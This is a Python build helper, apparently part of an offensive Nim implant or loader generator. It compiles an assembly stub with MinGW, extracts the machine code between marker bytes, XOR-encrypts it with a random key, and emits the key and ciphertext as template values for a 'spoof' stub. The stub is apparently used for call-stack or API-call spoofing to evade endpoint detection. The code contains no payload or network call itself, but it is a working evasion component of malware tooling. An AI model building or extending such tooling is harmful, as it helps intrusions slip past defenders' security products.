import os
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path


def stub_replacements(dest, arch="x64"):
    # Builds the encrypted stub bytes for the spoof
    dest = Path(dest)
    stubNim = dest / "utils" / "winapi" / "stub.nim"
    stubS = dest / "utils" / "winapi" / "stub.s"
    if not stubNim.is_file() or not stubS.is_file():
        return {}
    if str(arch or "x64").strip().lower() != "x64":
        return {}

    gcc = os.environ.get("MINGW64_GCC", "").strip()
    if not (gcc and os.path.isfile(gcc) and os.access(gcc, os.X_OK)):
        gcc = shutil.which("x86_64-w64-mingw32-gcc")
    if not gcc:
        candidate = Path("/usr/bin") / "x86_64-w64-mingw32-gcc"
        gcc = str(candidate) if candidate.is_file() and os.access(candidate, os.X_OK) else None
    if not gcc:
        return {}

    objcopy = os.environ.get("MINGW64_OBJCOPY", "").strip()
    if not (objcopy and os.path.isfile(objcopy) and os.access(objcopy, os.X_OK)):
        objcopy = shutil.which("x86_64-w64-mingw32-objcopy") or shutil.which("objcopy")
    if not objcopy:
        for name in ("x86_64-w64-mingw32-objcopy", "objcopy"):
            candidate = Path("/usr/bin") / name
            if candidate.is_file() and os.access(candidate, os.X_OK):
                objcopy = str(candidate)
                break
    if not objcopy:
        return {}

    try:
        with tempfile.TemporaryDirectory() as td:
            obj = os.path.join(td, "stub.o")
            compileProc = subprocess.run(
                [gcc, "-c", str(stubS), "-o", obj],
                capture_output=True,
                timeout=60,
            )
            if compileProc.returncode:
                return {}

            textFile = os.path.join(td, "stub.text.bin")
            dumpProc = subprocess.run(
                [objcopy, "-O", "binary", "--only-section=.text", obj, textFile],
                capture_output=True,
                timeout=60,
            )
            if dumpProc.returncode or not os.path.isfile(textFile):
                return {}
            with open(textFile, "rb") as f:
                text = f.read()
    except (subprocess.TimeoutExpired, OSError):
        return {}

    start = text.find(bytes.fromhex("584989fa4989f3"))
    if start < 0:
        return {}
    end = text.find(bytes.fromhex("ff6108"), start)
    if end < 0:
        return {}
    raw = text[start : end + 3]
    if len(raw) < 64:
        return {}

    key = secrets.token_bytes(16)
    cipher = bytes(b ^ key[i % 16] for i, b in enumerate(raw))
    return {
        "<spoofStubKey>": "".join("\\x%02x" % b for b in key),
        "<spoofStub>": "".join("\\x%02x" % b for b in cipher),
    }
